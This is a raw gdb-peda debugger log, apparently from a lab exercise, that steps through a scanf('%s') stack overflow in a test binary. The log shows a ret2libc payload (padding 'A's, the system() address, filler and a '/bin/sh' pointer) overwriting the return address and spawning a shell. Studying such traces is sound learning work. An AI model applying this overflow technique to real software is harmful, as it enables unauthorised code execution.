+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mEIP[0m: [;31m0x8048444[0m (<vul+1>:	mov    ebp,esp)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048441 <run_shell+22>:[;2m	leave  [0m
+   0x8048442 <run_shell+23>:[;2;34m	ret    [0m
+   0x8048443 <vul>:[;2m	push   ebp[0m
+=> 0x8048444 <vul+1>:[;1;32m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 [0m
+[m0004| [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)[0m
+[m0008| [;34m0xffffcf60[0m --> [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 [0m
+[m0012| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0016| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0020| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0024| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0028| [;34m0xffffcf74[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048444 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mEIP[0m: [;31m0x8048446[0m (<vul+3>:	sub    esp,0x18)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048442 <run_shell+23>:[;2;34m	ret    [0m
+   0x8048443 <vul>:[;2m	push   ebp[0m
+   0x8048444 <vul+1>:[;2m	mov    ebp,esp[0m
+=> 0x8048446 <vul+3>:[;1;32m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 [0m
+[m0004| [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)[0m
+[m0008| [;34m0xffffcf60[0m --> [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 [0m
+[m0012| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0016| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0020| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0024| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0028| [;34m0xffffcf74[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048446 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEIP[0m: [;31m0x8048449[0m (<vul+6>:	sub    esp,0x8)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048443 <vul>:[;2m	push   ebp[0m
+   0x8048444 <vul+1>:[;2m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+=> 0x8048449 <vul+6>:[;1;32m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0004| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0008| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0016| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0024| [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048449 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf38[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804844c[0m (<vul+9>:	lea    eax,[ebp-0x18])[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048444 <vul+1>:[;2m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+=> 0x804844c <vul+9>:[;1;32m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0008| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0012| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0016| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0024| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804844c in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf38[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804844f[0m (<vul+12>:	push   eax)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+=> 0x804844f <vul+12>:[;1;32m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0008| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0012| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0016| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0024| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804844f in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEIP[0m: [;31m0x8048450[0m (<vul+13>:	push   0x8048528)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[;2m	push   eax[0m
+=> 0x8048450 <vul+13>:[;1;32m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0004| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0008| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0012| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0016| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0020| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0024| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0028| [;34m0xffffcf50[0m --> 0x1 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048450 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')
+[;32mEIP[0m: [;31m0x8048455[0m (<vul+18>:	call   0x8048300 <scanf@plt>)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[;2m	push   eax[0m
+   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+=> 0x8048455 <vul+18>:[;1;32m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m[0m
+[mGuessed arguments:[0m
+[marg[0]: [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[marg[1]: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[marg[2]: 0x1 [0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[m0004| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0008| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0016| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0020| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0024| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048455 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m ("AAAA\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)
+[;32mESP[0m: [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')
+[;32mEIP[0m: [;31m0x804845a[0m (<vul+23>:	add    esp,0x10)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804844f <vul+12>:[;2m	push   eax[0m
+   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+=> 0x804845a <vul+23>:[;1;32m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[m0004| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m ('A' <repeats 28 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0008| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0016| [;34m0xffffcf40[0m ('A' <repeats 28 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0020| [;34m0xffffcf44[0m ('A' <repeats 24 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0024| [;34m0xffffcf48[0m ('A' <repeats 20 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0028| [;34m0xffffcf4c[0m ('A' <repeats 16 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845a in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m ("AAAA\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)
+[;32mESP[0m: [;34m0xffffcf40[0m ('A' <repeats 28 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)
+[;32mEIP[0m: [;31m0x804845d[0m (<vul+26>:	leave)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[;2m	add    esp,0x10[0m
+=> 0x804845d <vul+26>:[;1;32m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m
+   0x8048466 <main+7>:[m	push   DWORD PTR [ecx-0x4][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf40[0m ('A' <repeats 28 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0004| [;34m0xffffcf44[0m ('A' <repeats 24 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0008| [;34m0xffffcf48[0m ('A' <repeats 20 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0012| [;34m0xffffcf4c[0m ('A' <repeats 16 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0016| [;34m0xffffcf50[0m ('A' <repeats 12 times>, "\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0020| [;34m0xffffcf54[0m ("AAAAAAAA\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0024| [;34m0xffffcf58[0m ("AAAA\340\023\344\367BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0028| [;34m0xffffcf5c[0m --> [;31m0xf7e413e0[0m (<system>:	push   ebx)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845d in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41414141 ('AAAA')
+[;32mESP[0m: [;34m0xffffcf5c[0m --> [;31m0xf7e413e0[0m (<system>:	push   ebx)
+[;32mEIP[0m: [;31m0x804845e[0m (<vul+27>:	ret)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[;2m	add    esp,0x10[0m
+   0x804845d <vul+26>:[;2m	leave  [0m
+=> 0x804845e <vul+27>:[;1;32m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m
+   0x8048466 <main+7>:[m	push   DWORD PTR [ecx-0x4][0m
+   0x8048469 <main+10>:[m	push   ebp[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf5c[0m --> [;31m0xf7e413e0[0m (<system>:	push   ebx)[0m
+[m0004| [;34m0xffffcf60[0m ("BBBB\211*\366", <incomplete sequence \367>)[0m
+[m0008| [;34m0xffffcf64[0m --> [;32m0xf7f62a89[0m ("/bin/sh")[0m
+[m0012| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0016| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0020| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0024| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf78[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845e in vul ()
+[;31mgdb-peda$ [0m(reverse-i-search)`': x': x/40x $esp-0x40[1@/[C[C[C[14P[;31mgdb-peda$ [0m
+0xffffcf1c:	0x00000000	0xffffcf40	0xf7ffd938	0xf7fac000
+0xffffcf2c:	0x0804845a	0x08048528	0xffffcf40	0x00000001
+0xffffcf3c:	0x080482bd	0x41414141	0x41414141	0x41414141
+0xffffcf4c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf5c:	0xf7e413e0	0x42424242	0xf7f62a89	0x00000000
+0xffffcf6c:	0xf7e1ca63	0x08048490	0x00000000	0x00000000
+0xffffcf7c:	0xf7e1ca63	0x00000001	0xffffd014	0xffffd01c
+0xffffcf8c:	0xf7feac3a	0x00000001	0xffffd014	0xffffcfb4
+0xffffcf9c:	0x08049774	0x0804820c	0xf7fac000	0x00000000
+0xffffcfac:	0x00000000	0x00000000	0x7191c030	0x4d9a8420
+[;31mgdb-peda$ [0mx/i 0xf7e413e0
+   0xf7e413e0 <system>:	push   ebx
+[;31mgdb-peda$ [0mx/s 0xf7f62a89
+0xf7f62a89:	"/bin/sh"
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 7209]
+process 7209 is executing new program: /bin/dash
+[New process 7210]
+process 7210 is executing new program: /bin/dash
+[Inferior 3 (process 7210) exited normally]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mquit
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=eexit[?1l>
+kexit\
